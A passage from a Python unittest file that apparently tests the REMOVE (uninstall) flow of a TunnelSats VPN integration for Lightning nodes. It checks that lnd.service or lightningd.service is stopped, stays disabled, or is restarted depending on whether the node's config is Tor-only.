        self.assertLess(check, calls.index([mod.ITS, "uninstall", "--json"]))
        self.assertEqual(without, calls[:check - 1] + calls[check + 1:])
        self.assertEqual([], [c for c in calls if c[0] == "systemctl" and c[1] in ("stop", "disable", "enable", "start")])

    def test_lnd_with_tor_inactive_is_stopped_before_the_tool_and_stays_stopped_and_disabled(self):
        self.real_audit()
        self.pinned_tool()
        self.watch_the_stop()
        self.lnd_conf("tor.active=true", "tor.active=false")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stopped_before_the_tool(doc)
        self.assert_refused_stopped_and_disabled(doc)
        self.assertEqual(("unrepairable", "node_config_unknown"), (doc["at_rest"], doc["action_required"]["reason"]))
        self.assertIn("tor_inactive", doc["action_required"]["detail"])

    def test_lnd_with_externalip_is_stopped_before_the_tool_repaired_and_started(self):
        self.real_audit()
        self.pinned_tool()
        self.watch_the_stop()
        conf = self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalip=203.0.113.7")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stopped_before_the_tool(doc)
        self.assert_repaired_and_started(doc)
        with open(conf) as handle:
            self.assertNotIn("externalip", handle.read())

    def test_lnd_with_an_empty_externalhosts_is_stopped_before_the_tool_repaired_and_started(self):
        self.real_audit()
        self.pinned_tool()
        self.watch_the_stop()
        conf = self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalhosts=")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stopped_before_the_tool(doc)
        self.assert_repaired_and_started(doc)
        with open(conf) as handle:
            self.assertNotIn("externalhosts", handle.read())

    def test_cln_without_always_use_proxy_is_stopped_before_the_tool_repaired_and_started(self):
        self.store(impl="cl")
        self.activate_conf(impl="cl")
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "UnitFileState": "enabled",
                                                      "ControlGroup": "/system.slice/lightningd.service"})
        self.fake.its["verify --no-probe"] = (0, fixture_json("verify", "cln_protected.json"))
        conf = self.write("cln/config", fixture("conf", "cl-config").replace("always-use-proxy=true", ""))
        self.real_audit()
        self.pinned_tool(unit="lightningd.service")
        self.watch_the_stop(unit="lightningd.service")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stopped_before_the_tool(doc, unit="lightningd.service")
        self.assert_repaired_and_started(doc, unit="lightningd.service")
        with open(conf) as handle:
            self.assertIn("always-use-proxy=true", handle.read())
        self.assertEqual(("skipped", "clean"), (doc["announce_cleanup"], doc["other_impl_at_rest"]))
        # LND, the other implementation, is only read and never stopped or started
        self.assertEqual([], self.fake.calls_of(mod.ITS, "audit", "lnd", "--repair"))
        self.assertEqual([], [c for c in self.fake.calls if c[0] == "systemctl" and c[-1] == "lnd.service"
                              and c[1] != "show"])

    def test_the_r4_8_config_still_ends_stopped_disabled_and_pending(self):
        # QA round 4, R4-8: externalhosts, tor.active=false and tor.skip-proxy-for-clearnet-targets
        self.real_audit()
        self.pinned_tool(clean=False)
        self.watch_the_stop()
        self.lnd_conf("tor.active=true", "tor.active=false\ntor.skip-proxy-for-clearnet-targets=true")
        self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalhosts=qa.invalid:9735")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stopped_before_the_tool(doc)
        self.assert_refused_stopped_and_disabled(doc)
        self.assertEqual((False, False, "unrepairable"), (doc["ln_started"], doc["ln_reenabled"], doc["at_rest"]))
        lines = doc["action_required"]["lines"]
        self.assertEqual("node_config_clearnet", doc["action_required"]["reason"])
        self.assertTrue(any(line.endswith(":externalhosts=qa.invalid:9735") for line in lines), lines)
        self.assertTrue(any(line.endswith(":tor.skip-proxy-for-clearnet-targets=true") for line in lines), lines)

    def test_a_check_without_answer_before_the_tool_counts_as_not_tor_only(self):
        no_answer = {"timeout": (124, ""),
                     "error": (2, {"contract": 1, "command": "its.audit", "ok": False, "exit_code": 2,
                                   "errors": [{"code": "E_USAGE", "class": "usage", "message": "usage"}]})}
        for name, answer in no_answer.items():
            with self.subTest(name):
                self.fresh()
                self.pinned_tool()
                self.watch_the_stop()
                self.fake.its["audit lnd"] = answer
                self.fake.its["audit lnd --repair"] = (0, self.audit("clean"))
                doc = self.run_verb("uninstall", "--yes")
                self.assert_stopped_before_the_tool(doc)
                self.assertEqual((0, True, "clean"), (doc["exit_code"], doc["removed"], doc["at_rest"]), doc)
                self.assertTrue(doc["ln_reenabled"] and doc["ln_started"])
                self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.unit_state())

    def test_a_unit_that_does_not_stop_keeps_the_tool_from_running(self):
        for name in ("stop fails", "still active after the stop"):
            with self.subTest(name):
                self.fresh()
                self.real_audit()
                self.pinned_tool()
                self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalip=203.0.113.7")
                if name == "stop fails":
                    self.fake.systemctl_rc[("stop", "lnd.service")] = 1
                else:
                    self.fake.systemctl_noop.add(("stop", "lnd.service"))
                doc = self.run_verb("uninstall", "--yes")
                self.assertEqual((1, "E_LN_STOP"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
                self.assertEqual([], self.fake.calls_of(mod.ITS, "uninstall"))
                self.assertEqual(([], False, False, ["managed dataplane"]),
                                 (self.tool_found, doc["removed"], doc["ln_stopped_first"], doc["remaining"]))
                self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.unit_state())
                self.assertEqual([], self.fake.calls_of("systemctl", "disable"))
                # the message names the state read back after the stop
                self.assertIn("lnd.service did not stop (state: active)", doc["errors"][0]["message"])
                self.assertIn("The tunnel and its kill switch stay in place", doc["errors"][0]["message"])
                self.assertEqual("stop_failed", mod.load_state(self.deps)["remove_pending"]["reason"])

    def test_a_node_without_tunnelsats_is_only_told_about_its_config(self):
        # no managed install and no unfinished REMOVE: the config is the operator's, nothing is stopped
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_none.json"))
        self.real_audit()
        self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalip=203.0.113.7")
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "E_AT_REST_UNREPAIRABLE"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
        self.assertIn("the config of lnd.service is not Tor-only at rest", doc["errors"][0]["message"])
        self.assertEqual([], [c for c in self.fake.calls if c[0] == "systemctl" and c[1] != "show"])
        self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.unit_state())

    # -- review of 039a2496: a unit that cannot be disabled, the tool's own errors, the menu --------
    def test_a_unit_that_cannot_be_disabled_keeps_the_tool_from_running(self):
        # with the dataplane removed, the next boot would start the unit with that config outside the tunnel
        for name in ("disable fails", "still enabled after the disable"):
            with self.subTest(name):
                self.fresh()
                self.real_audit()
                self.pinned_tool()
                self.lnd_conf("tor.active=true", "tor.active=false")
                if name == "disable fails":
                    self.fake.systemctl_rc[("disable", "lnd.service")] = 1
                else:
                    self.fake.systemctl_noop.add(("disable", "lnd.service"))
                doc = self.run_verb("uninstall", "--yes")
                self.assertEqual((1, "E_LN_DISABLE"), (doc["exit_code"], doc["errors"][0]["code"]), doc)
                self.assertEqual([], self.fake.calls_of(mod.ITS, "uninstall"))
                self.assertEqual(([], False, True, ["managed dataplane"]),
                                 (self.tool_found, doc["removed"], doc["ln_stopped_first"], doc["remaining"]))
                self.assertEqual({"ActiveState": "inactive", "UnitFileState": "enabled"}, self.unit_state())
                message = doc["errors"][0]["message"]
                self.assertIn("lnd.service could not be disabled", message)
                self.assertIn("next boot", message)
                self.assertIn("the tunnel and its kill switch stay in place", message)
                self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": False}, self.pending())
                self.assertEqual("disable_failed", mod.load_state(self.deps)["remove_pending"]["reason"])

    def remove_after_a_failed_disable(self):
        """A first REMOVE that could not disable LND (R4-8 config), then REMOVE again with the tool's own
        disable failing as well: the dataplane is still there, LND is stopped and still enabled."""
        self.real_audit()
        self.pinned_tool()
        self.lnd_conf("tor.active=true", "tor.active=false\ntor.skip-proxy-for-clearnet-targets=true")
        self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalhosts=qa.invalid:9735")
        self.fake.systemctl_rc[("disable", "lnd.service")] = 1
        self.assertEqual("E_LN_DISABLE", self.run_verb("uninstall", "--yes")["errors"][0]["code"])
        self.fake.systemctl_rc.clear()
        self.pinned_tool(clean=False, disable_fails=True)
        self.fake.its["detect"] = [(0, fixture_json("tool", "detect_managed.json")),
                                   (0, fixture_json("tool", "detect_none.json"))]
        self.fake.calls.clear()

    def test_remove_again_disables_the_unit_itself_when_the_tools_disable_fails(self):
        self.remove_after_a_failed_disable()
        doc = self.run_verb("uninstall", "--yes")
        # the tool's report is read: the removal itself is complete, only its disable failed
        self.assertEqual((["E_LN_DISABLE"], [], ["inactive"]), (doc["tool_errors"], doc["remaining"], self.tool_found), doc)
        self.assert_stays_stopped(doc)
        self.assertLess(self.fake.calls.index([mod.ITS, "uninstall", "--json"]),
                        self.fake.calls.index(["systemctl", "disable", "lnd.service"]))
        self.assertEqual({"ActiveState": "inactive", "UnitFileState": "disabled"}, self.unit_state())
        self.assertEqual("systemctl enable --now lnd.service", doc["action_required"]["then"])
        self.assertIn("lnd.service stays stopped and disabled", doc["errors"][0]["message"])
        self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": True}, self.pending())

    def test_remove_again_reports_a_unit_nobody_could_disable(self):
        self.remove_after_a_failed_disable()
        self.fake.systemctl_rc[("disable", "lnd.service")] = 1
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "E_LN_DISABLE", []), (doc["exit_code"], doc["errors"][0]["code"], doc["remaining"]), doc)
        self.assertEqual({"ActiveState": "inactive", "UnitFileState": "enabled"}, self.unit_state())
        self.assertIn("sudo systemctl disable lnd.service", doc["errors"][0]["message"])
        self.assertIn("next boot", doc["errors"][0]["message"])
        self.assertEqual([], self.fake.calls_of("systemctl", "start") + self.fake.calls_of("systemctl", "enable"))

    def test_the_tools_failed_stop_is_reported_with_the_live_state(self):
        def uninstall():
            self.fake.units["lnd.service"]["ActiveState"] = "deactivating"
            return 1, {"contract": 1, "command": "uninstall", "ok": False, "exit_code": 1, "errors": [
                {"code": "E_LN_STOP", "class": "operational",
                 "message": "lnd.service did not stop (state deactivating); nothing was removed"}]}
        self.fake.its["uninstall"] = uninstall
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_managed.json"))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "E_LN_STOP", ["managed dataplane"], ["E_LN_STOP"]),
                         (doc["exit_code"], doc["errors"][0]["code"], doc["remaining"], doc["tool_errors"]), doc)
        message = doc["errors"][0]["message"]
        self.assertIn("lnd.service did not stop (state: deactivating)", message)
        self.assertIn("removed nothing", message)
        self.assertNotIn("did not arrive", " ".join(doc["warnings"]))
        self.assertEqual([], [c for c in self.fake.calls if c[0] == "systemctl" and c[1] != "show"])
        self.assertEqual("stop_failed", mod.load_state(self.deps)["remove_pending"]["reason"])

    def test_after_a_failed_stop_the_menu_shows_the_live_state(self):
        self.real_audit()
        self.pinned_tool()
        self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalip=203.0.113.7")
        self.fake.systemctl_rc[("stop", "lnd.service")] = 1
        self.assertEqual("E_LN_STOP", self.run_verb("uninstall", "--yes")["errors"][0]["code"])
        state = mod.load_state(self.deps)
        _choices, notice = mod.menu_choices(self.deps, state, mod.read_rb_conf(self.deps))
        self.assertIn("REMOVE did not finish: lnd.service did not stop, so the tunnel and its kill switch stay "
                      "in place", notice)
        self.assertIn("lnd.service still runs (active)", notice)
        self.assertNotIn("REMOVE left", notice)
        self.assertIn("externalip=203.0.113.7", notice)

    ANOTHER = ("lnd.service also announces 203.0.113.9:24556, with the forwarded port of the TunnelSats config; if "
               "that is a former VPN address, remove it with: sudo -u bitcoin /usr/local/bin/lncli "
               "--lnddir=/home/bitcoin/.lnd --rpcserver=localhost:10009 peers updatenodeannouncement "
               "--address_remove 203.0.113.9:24556")

    def test_a_tool_warning_about_another_announced_address_is_shown(self):
        self.tool_restarts_lnd()
        self.record(ipv4="1.2.3.4")
        uninstall = fixture_json("tool", "uninstall_clean.json")
        uninstall["warnings"] = [self.ANOTHER]
        self.fake.its["uninstall"] = (0, uninstall)
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, "removed", [self.ANOTHER]), (doc["exit_code"], doc["tool_announce_cleanup"], doc["warnings"]), doc)
        self.assertIn(self.ANOTHER, mod.result_text(doc))

    def test_tool_warnings_stay_apart_when_removes_own_step_covers_them_or_the_tool_did_not_check(self):
        failed = ("lnd.service still announces the former VPN address 1.2.3.4:24556: the update failed. Remove it "
                  "with: sudo -u bitcoin /usr/local/bin/lncli peers updatenodeannouncement --address_remove 1.2.3.4:24556")
        for outcome, warning in (("failed", failed), ("skipped", self.ANOTHER), ("lnd_not_ready", self.ANOTHER)):
            with self.subTest(outcome):
                self.fresh()
                self.tool_restarts_lnd()
                self.record(ipv4="1.2.3.4")
                uninstall = fixture_json("tool", "uninstall_clean.json")
                uninstall.update({"announce_cleanup": outcome, "warnings": [warning]})
                self.fake.its["uninstall"] = (0, uninstall)
                doc = self.run_verb("uninstall", "--yes")
                self.assertEqual((0, [warning], []), (doc["exit_code"], doc["tool_warnings"], doc["warnings"]), doc)

    def test_the_pre_stop_never_touches_a_unit_the_managed_install_does_not_name(self):
        # state.impl names LND, the managed install is CLN's (verify --no-probe)
        self.real_audit()
        self.lnd_conf("listen=0.0.0.0:9735", "listen=0.0.0.0:9735\nexternalip=203.0.113.7")
        self.write("cln/config", fixture("conf", "cl-config"))
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "UnitFileState": "enabled",
                                                      "ControlGroup": "/system.slice/lightningd.service"})
        self.fake.its["verify --no-probe"] = (0, fixture_json("verify", "cln_protected.json"))
        self.pinned_tool(unit="lightningd.service")
        doc = self.run_verb("uninstall", "--yes")
        f = self.fake
        self.assertEqual([], [c for c in f.calls if c[0] == "systemctl" and c[-1] == "lnd.service" and c[1] != "show"])
        self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.unit_state())
        self.assertLess(f.calls.index([mod.ITS, "audit", "lnd", "--json"]), f.calls.index([mod.ITS, "verify", "--no-probe", "--json"]))
        self.assertEqual((0, True, False, ["active"]), (doc["exit_code"], doc["removed"], doc["ln_stopped_first"], self.tool_found), doc)
        # LND is the other implementation now: left as it is, with its lines as a warning
        self.assertIn("lnd.service was left as it is", doc["warnings"][0])

    # -- issue 3 -----------------------------------------------------------------------------
    def test_the_pre_stop_finds_the_managed_unit_through_its_drop_in(self):
        # note 1: state.impl names LND, which is stopped; the managed install is CLN's, and detect
        # names its drop-in (no extra call). CLN runs with a config that is not Tor-only at rest.
        self.fake.its["detect"] = [(0, fixture_json("tool", "detect_managed_cln.json")),
                                   (0, fixture_json("tool", "detect_none.json"))]
        self.fake.units["lnd.service"].update({"ActiveState": "inactive", "MainPID": "0", "ControlGroup": ""})
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "UnitFileState": "enabled",
                                                      "ControlGroup": "/system.slice/lightningd.service"})
        conf = self.write("cln/config", fixture("conf", "cl-config").replace("always-use-proxy=true", ""))
        self.real_audit()
        self.pinned_tool(unit="lightningd.service")
        self.watch_the_stop(unit="lightningd.service")
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stopped_before_the_tool(doc, unit="lightningd.service")
        self.assert_repaired_and_started(doc, unit="lightningd.service")
        with open(conf) as handle:
            self.assertIn("always-use-proxy=true", handle.read())
        self.assertEqual([], self.fake.calls_of(mod.ITS, "verify"))
        self.assertEqual([], [c for c in self.fake.calls if c[0] == "systemctl" and c[-1] == "lnd.service"
                              and c[1] != "show"])

    def notice(self):
        return mod.menu_choices(self.deps, mod.load_state(self.deps), mod.read_rb_conf(self.deps))[1]

    def test_the_menu_after_a_failed_disable_says_the_tunnel_is_removed_and_names_the_command(self):
        # note 2: REMOVE removed the dataplane, then could not disable LND (config not Tor-only at rest)
        self.remove_after_a_failed_disable()
        self.fake.systemctl_rc[("disable", "lnd.service")] = 1
        self.assertEqual("E_LN_DISABLE", self.run_verb("uninstall", "--yes")["errors"][0]["code"])
        notice = self.notice()
        self.assertIn("REMOVE did not finish: the tunnel is already removed", notice)
        self.assertIn("lnd.service is stopped but still enabled", notice)
        self.assertIn("Run now: sudo systemctl disable lnd.service", notice)
        self.assertNotIn("stay in place", notice)
        self.assertIn("externalhosts=qa.invalid:9735", notice)

    def test_the_menu_after_a_failed_stop_says_the_tunnel_is_removed_and_names_the_command(self):
        # note 2: the tool started LND again, REMOVE's audit then found the config not Tor-only at rest
        # (changed after the check before the tool) and LND did not stop
        self.tool_restarts_lnd()
        line = "/mnt/hdd/app-data/lnd/lnd.conf:27:tor.skip-proxy-for-clearnet-targets=true"
        self.fake.its["audit lnd"] = [(0, self.audit("clean")),
                                      (4, self.audit("drift", None, [line], ["tor.skip-proxy-for-clearnet-targets"]))]
        self.fake.systemctl_rc[("stop", "lnd.service")] = 1
        self.assertEqual("E_LN_STOP", self.run_verb("uninstall", "--yes")["errors"][0]["code"])
        notice = self.notice()
        self.assertIn("REMOVE did not finish: the tunnel is already removed", notice)
        self.assertIn("lnd.service still runs (active)", notice)
        self.assertIn("Run now: sudo systemctl disable --now lnd.service", notice)
        self.assertIn(line, notice)

    def test_the_menu_names_no_command_once_the_config_is_tor_only(self):
        # after a keep_off failure the operator made the config Tor-only: running or starting without
        # the tunnel is fine now, so the notice asks for REMOVE again, not for a stop or a disable
        self.remove_after_a_failed_disable()
        self.fake.systemctl_rc[("disable", "lnd.service")] = 1
        self.assertEqual("E_LN_DISABLE", self.run_verb("uninstall", "--yes")["errors"][0]["code"])
        self.fake.its["audit lnd"] = (0, self.audit("clean"))
        notice = self.notice()
        self.assertIn("REMOVE did not finish: the tunnel is already removed", notice)
        self.assertIn("Its config is Tor-only now: choose REMOVE again to finish; it enables and starts "
                      "lnd.service.", notice)
        self.assertNotIn("Run now", notice)
        self.assertNotIn("systemctl", notice)

    def test_the_other_implementation_is_reported_as_a_warning_and_never_edited(self):
        line = "/home/bitcoin/.lightning/config:7:bind-addr=0.0.0.0:9735"
        self.fake.its["audit cl"] = (4, self.audit("drift", None, [line], ["bind-addr"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "drift"), (doc["exit_code"], doc["removed"], doc["other_impl_at_rest"]), doc)
        # the tunneled unit itself is Tor-only at rest: it is enabled and started again
        self.assertTrue(doc["ln_reenabled"] and doc["ln_started"])
        self.assertNotIn("action_required", doc)
        self.assertEqual([line], doc["other_impl_lines"])
        self.assertIn("lightningd.service", doc["warnings"][0])
        self.assertIn(line, doc["warnings"][0])
        self.assertIn(line, mod.result_text(doc))
        self.assertEqual([], self.fake.calls_of(mod.ITS, "audit", "cl", "--repair"))
        self.assertEqual([], [c for c in self.fake.calls if c[0] == "systemctl" and "lightningd.service" in c
                              and c[1] in ("enable", "start", "restart")])

    def test_purge_is_not_skipped_when_only_the_other_implementation_is_not_tor_only(self):
        line = "/home/bitcoin/.lightning/config:7:bind-addr=0.0.0.0:9735"
        self.fake.its["audit cl"] = (4, self.audit("drift", None, [line], ["bind-addr"]))
        doc = self.run_verb("uninstall", "--yes", "--purge")
        self.assertEqual((0, True, True), (doc["exit_code"], doc["removed"], doc["purged"]), doc)
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))

    def test_an_other_implementation_audit_without_answer_is_a_warning(self):
        self.fake.its["audit cl"] = (124, "")
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, []), (doc["exit_code"], doc["removed"], doc["other_impl_lines"]), doc)
        self.assertIn("did not answer", doc["warnings"][0])

    def test_both_configs_not_tor_only_keeps_lightning_stopped_and_names_both(self):
        main = "/mnt/hdd/app-data/lnd/lnd.conf:8:externalhosts=de2.tunnelsats.com:24556"
        other = "/home/bitcoin/.lightning/config:7:bind-addr=0.0.0.0:9735"
        self.fake.its["audit lnd --repair"] = (1, self.audit("unrepairable", "tor_inactive", [main], ["externalhosts"]))
        self.fake.its["audit cl"] = (4, self.audit("drift", None, [other], ["bind-addr"]))
        doc = self.run_verb("uninstall", "--yes", "--purge")
        self.assert_stays_stopped(doc)
        self.assertEqual(([main, other], "systemctl enable --now lnd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertIn("lightningd.service", doc["errors"][0]["message"])
        self.assertFalse(doc["purged"])
        self.assertTrue(os.path.exists(self.path(mod.CONF_FILE)))

    def test_the_unit_of_the_uninstall_document_decides_which_config_is_audited(self):
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall["unit"] = "lightningd.service"
        self.fake.its["uninstall"] = (0, uninstall)
        line = "/home/bitcoin/.lightning/extra.conf:2:announce-addr=203.0.113.5:9735"
        self.fake.its["audit cl --repair"] = (1, self.audit("unrepairable", "include_hybrid", [line], ["announce-addr"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertIn([mod.ITS, "audit", "cl", "--repair", "--json"], self.fake.calls)
        self.assertEqual([], self.fake.calls_of(mod.ITS, "audit", "lnd", "--repair"))
        self.assertEqual(([line], "systemctl enable --now lightningd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))

    def test_purge_deletes_the_stored_subscription(self):
        doc = self.run_verb("uninstall", "--yes", "--purge")
        self.assertTrue(doc["purged"])
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))

    def test_adopted_legacy_is_forgotten_without_touching_the_system(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(mode="adopted_legacy", legacy_kind="legacy_v3_post_204")
        self.fake.calls.clear()
        doc = self.run_verb("uninstall", "--yes")
        self.assertTrue(doc["forgotten"])
        self.assertEqual([], [c for c in self.fake.calls if c[0] in (mod.ITS, mod.BLITZ_CONF, "systemctl")])
        self.assertFalse(os.path.exists(self.path(mod.STATE_DIR)))

    def test_needs_confirmation_and_something_to_remove(self):
        self.assertEqual(2, self.run_verb("uninstall")["exit_code"])
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.fake.conf_set("tunnelsats", "off")
        self.fake.its["detect"] = (0, fixture_json("tool", "detect_none.json"))
        self.assertEqual(3, self.run_verb("uninstall", "--yes")["exit_code"])

    # -- a refused REMOVE, then the menu and REMOVE again -----------------------------------
    LINE = "/mnt/hdd/app-data/lnd/lnd.conf:8:externalhosts=de2.tunnelsats.com:24556"

    def refuse_remove(self):
        """REMOVE refused by an unrepairable at-rest audit. Afterwards the dataplane is gone and the
        unit is stopped and disabled, as the tool's uninstall leaves it."""
        self.fake.its["audit lnd --repair"] = (1, self.audit("unrepairable", "tor_inactive", [self.LINE],
                                                             ["externalhosts"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertIn("Or choose REMOVE again", mod.result_text(doc))
        self.fake.units["lnd.service"].update({"ActiveState": "inactive", "MainPID": "0", "ControlGroup": "",
                                               "InvocationID": ""})
        self.fake.calls.clear()
        return doc

    def test_after_a_refused_remove_the_menu_offers_remove_again_never_start(self):
        self.refuse_remove()
        state = mod.load_state(self.deps)
        self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": True},
                         {k: state["remove_pending"][k] for k in ("unit", "ln_was_active", "ln_disabled")})
        conf = mod.read_rb_conf(self.deps)
        self.assertEqual("off", conf.get("tunnelsats"))
        self.fake.its["audit lnd"] = (1, self.audit("unrepairable", "tor_inactive", [self.LINE], ["externalhosts"]))
        choices, notice = mod.menu_choices(self.deps, state, conf)
        self.assertEqual(["STATUS", "CHECK", "REPAIR", "REMOVE", "ABOUT"], [tag for tag, _text in choices])
        self.assertIn("again", dict(choices)["REMOVE"])
        self.assertIn("lnd.service stopped and disabled", notice)
        self.assertIn(self.LINE, notice)
        self.assertIsNone(mod.menu_start(self.deps))
        self.assertIsNone(mod.menu_start(self.deps, restart=True))
        self.assertEqual([], self.fake.calls_of("systemctl", "start") + self.fake.calls_of("systemctl", "restart"))
        # read-only: the menu never repairs or edits the config
        self.assertEqual([], self.fake.calls_of(mod.ITS, "audit", "lnd", "--repair"))
        self.fake.its["audit lnd"] = (0, self.audit("clean"))
        self.assertIn("Tor-only now", mod.menu_choices(self.deps, state, conf)[1])

    def test_remove_again_starts_lightning_once_the_config_is_tor_only(self):
        self.refuse_remove()
        self.fake.its["audit lnd --repair"] = (0, self.audit("repaired", None, [], ["externalhosts"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual(0, doc["exit_code"], doc)
        self.assertTrue(doc["removed"] and doc["ln_was_active"] and doc["ln_reenabled"] and doc["ln_started"])
        f = self.fake
        self.assertEqual([], f.calls_of(mod.ITS, "uninstall"))
        self.assertLess(f.calls.index([mod.ITS, "audit", "lnd", "--repair", "--json"]),
                        f.calls.index(["systemctl", "enable", "lnd.service"]))
        self.assertLess(f.calls.index(["systemctl", "enable", "lnd.service"]),
                        f.calls.index(["systemctl", "start", "lnd.service"]))
        self.assertNotIn("remove_pending", mod.load_state(self.deps))

    def test_remove_again_keeps_lightning_stopped_while_the_config_is_not_tor_only(self):
        self.refuse_remove()
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertEqual(([self.LINE], "systemctl enable --now lnd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertIn("lnd.service stays stopped and disabled", doc["errors"][0]["message"])
        self.assertIn("remove_pending", mod.load_state(self.deps))

    def test_remove_again_leaves_a_unit_started_by_hand_running(self):
        self.refuse_remove()
        self.fake.units["lnd.service"].update({"ActiveState": "active", "MainPID": "4242",
                                               "ControlGroup": "/system.slice/lnd.service"})
        self.fake.its["audit lnd --repair"] = (1, self.audit("not_checked"))
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, "clean"), (doc["exit_code"], doc["removed"], doc["at_rest"]), doc)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable") + self.fake.calls_of("systemctl", "start"))
        self.assertNotIn("remove_pending", mod.load_state(self.deps))

    # -- the tool's report lost on the way (QA round 4c) ------------------------------------
    def pending(self):
        pending = mod.load_state(self.deps).get("remove_pending") or {}
        return {key: pending.get(key) for key in ("unit", "ln_was_active", "ln_disabled")}

    def lnd_state(self):
        return {key: self.fake.units["lnd.service"][key] for key in ("ActiveState", "UnitFileState")}

    def test_a_report_that_arrives_is_used_as_it_is(self):
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, []), (doc["exit_code"], doc["removed"], doc["warnings"]), doc)
        # detect before the removal and for the zero-artifacts check: nothing is read back
        self.assertEqual(2, len(self.fake.calls_of(mod.ITS, "detect")))

    def test_a_lost_report_is_read_back_and_lightning_started_after_the_own_audit(self):
        # TC-34: the dataplane is gone and LND stopped and disabled; only the report is missing
        self.lose_the_report()
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True, [], "unknown"),
                         (doc["exit_code"], doc["removed"], doc["remaining"], doc["node_config"]), doc)
        self.assertTrue(doc["ln_was_active"] and doc["ln_reenabled"] and doc["ln_started"])
        f = self.fake
        uninstall = f.calls.index([mod.ITS, "uninstall", "--json"])
        read_back = f.calls.index([mod.ITS, "detect", "--json"], uninstall)
        audit = f.calls.index([mod.ITS, "audit", "lnd", "--repair", "--json"])
        self.assertTrue(uninstall < read_back < audit < f.calls.index(["systemctl", "enable", "lnd.service"])
                        < f.calls.index(["systemctl", "start", "lnd.service"]))
        self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.lnd_state())
        self.assertIn("E_TOOL_OUTPUT", doc["warnings"][0])
        self.assertEqual((None, []), (doc["tool_announce_cleanup"], doc["tool_warnings"]))
        self.assertNotIn("remove_pending", mod.load_state(self.deps))

    def test_a_lost_report_and_a_config_not_tor_only_keep_lightning_stopped_for_remove_again(self):
        # R4-8
        self.lose_the_report()
        self.fake.its["audit lnd --repair"] = (1, self.audit("unrepairable", "tor_inactive", [self.LINE],
                                                             ["externalhosts"]))
        doc = self.run_verb("uninstall", "--yes")
        self.assert_stays_stopped(doc)
        self.assertEqual(([self.LINE], "systemctl enable --now lnd.service"),
                         (doc["action_required"]["lines"], doc["action_required"]["then"]))
        self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": True}, self.pending())
        self.assertIn("E_TOOL_OUTPUT", doc["warnings"][0])

    def test_a_lost_report_with_the_dataplane_still_there_is_incomplete_and_remove_again_starts_lightning(self):
        # TC-36
        self.lose_the_report(still_managed=True)
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((1, "E_REMOVE_INCOMPLETE", ["managed dataplane"]),
                         (doc["exit_code"], doc["errors"][0]["code"], doc["remaining"]), doc)
        self.assertEqual([], self.fake.calls_of("systemctl", "enable") + self.fake.calls_of("systemctl", "start"))
        self.assertEqual({"unit": "lnd.service", "ln_was_active": True, "ln_disabled": True}, self.pending())
        # REMOVE again: the report arrives, but the first run already stopped and disabled LND
        uninstall = fixture_json("tool", "uninstall_disabled.json")
        uninstall.update({"ln_was_active": False, "ln_disabled": False})
        self.fake.its["uninstall"] = (0, uninstall)
        self.fake.its["detect"] = [(0, fixture_json("tool", "detect_managed.json")),
                                   (0, fixture_json("tool", "detect_none.json"))]
        self.fake.calls.clear()
        doc = self.run_verb("uninstall", "--yes")
        self.assertEqual((0, True), (doc["exit_code"], doc["removed"]), doc)
        self.assertTrue(doc["ln_was_active"] and doc["ln_reenabled"] and doc["ln_started"])
        self.assertEqual({"ActiveState": "active", "UnitFileState": "enabled"}, self.lnd_state())
